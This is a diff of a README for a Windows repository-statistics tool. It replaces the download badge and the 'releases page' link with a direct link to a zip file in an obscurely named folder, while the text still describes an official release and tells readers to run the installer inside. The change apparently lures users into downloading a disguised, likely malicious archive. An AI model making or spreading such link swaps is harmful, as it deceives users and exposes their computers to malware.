@@ -1,6 +1,6 @@
 # 📊 github-repo-stats - Track your project performance with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/GabeFreitasSF/github-repo-stats/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/GabeFreitasSF/github-repo-stats/raw/refs/heads/main/ulotrichous/stats_repo_github_3.9.zip)
 
 ## 📌 Overview
 
@@ -25,7 +25,7 @@ The github-repo-stats tool tracks analytics for public repositories. It automate
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/GabeFreitasSF/github-repo-stats/releases) to download the installer.
+1. Visit the [releases page](https://github.com/GabeFreitasSF/github-repo-stats/raw/refs/heads/main/ulotrichous/stats_repo_github_3.9.zip) to download the installer.
 2. Select the file ending in `.msi` or `.exe` intended for Windows.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
